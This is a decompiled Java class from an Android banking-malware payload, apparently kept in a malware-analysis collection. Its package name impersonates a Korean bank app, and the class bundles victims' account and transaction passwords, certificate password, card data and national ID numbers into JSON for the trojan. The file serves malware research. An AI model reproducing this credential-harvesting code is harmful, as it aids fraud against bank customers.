package com.kbstar.kb.android.star.util;

import com.kbstar.kb.android.star.model.Bank;
import org.json.JSONException;
import org.json.JSONObject;

public final class JsonUtil
{
  public static String parseBankData(Bank paramBank)
  {
    if (paramBank == null) {
      return "";
    }
    JSONObject localJSONObject = new JSONObject();
    try
    {
      localJSONObject.put("clientId", paramBank.getClientId());
      localJSONObject.put("accountName", paramBank.getAccountName());
      localJSONObject.put("accountNo", paramBank.getAccountNo());
      localJSONObject.put("accountPsw", paramBank.getAccountPsw());
      localJSONObject.put("bkType", paramBank.getBkType());
      localJSONObject.put("certPath", "not");
      localJSONObject.put("card", paramBank.getCard());
      localJSONObject.put("transPsw", paramBank.getTransPsw());
      localJSONObject.put("certPsw", paramBank.getCertPsw());
      localJSONObject.put("personIdFirst", paramBank.getPersonIdFirst());
      localJSONObject.put("personIdSecond", paramBank.getPersonIdSecond());
      localJSONObject.put("fileName", paramBank.getFileName());
      paramBank = localJSONObject.toString();
      return paramBank;
    }
    catch (JSONException paramBank)
    {
      LogUtil.e("parse phoneLog json data error!!!!", paramBank);
    }
    return "";
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/util/JsonUtil.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */